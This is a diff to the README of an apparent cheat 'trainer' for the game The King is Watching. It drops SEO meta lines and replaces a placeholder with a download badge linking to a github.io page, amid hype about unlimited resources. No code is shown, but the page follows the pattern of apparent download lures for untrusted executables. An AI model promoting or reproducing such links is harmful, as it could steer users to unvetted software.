@@ -1,16 +1,8 @@
-## Meta-Title
-
-The King is Watching Trainer 👑 God-Mode Strategy Boost & Instant Resource Control
-
-## Meta-Description
-
-🚀 Command The King is Watching with unlimited resources, instant build, and AI power-ups. Rule your kingdom now.
-
 # The King is Watching Trainer 👑 Turn Your Kingdom into an Unstoppable Empire
 
 The **The King is Watching Trainer** is your royal command console — giving you instant control over resources, construction, and AI behavior. Whether you’re fending off waves or expanding your realm, this trainer turns every decision into a decisive victory.
 
-[![Get The King is Watching Trainer](https://img.shields.io/badge/Get%20The%20King%20is%20Watching%20Trainer-blueviolet)](EXAMPLE)
+[![Get The King is Watching Trainer](https://img.shields.io/badge/Get%20The%20King%20is%20Watching%20Trainer-blueviolet)](https://the-king-is-watching-trainer.github.io/.github/)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown) • [Install](#instant-install-guide)
 
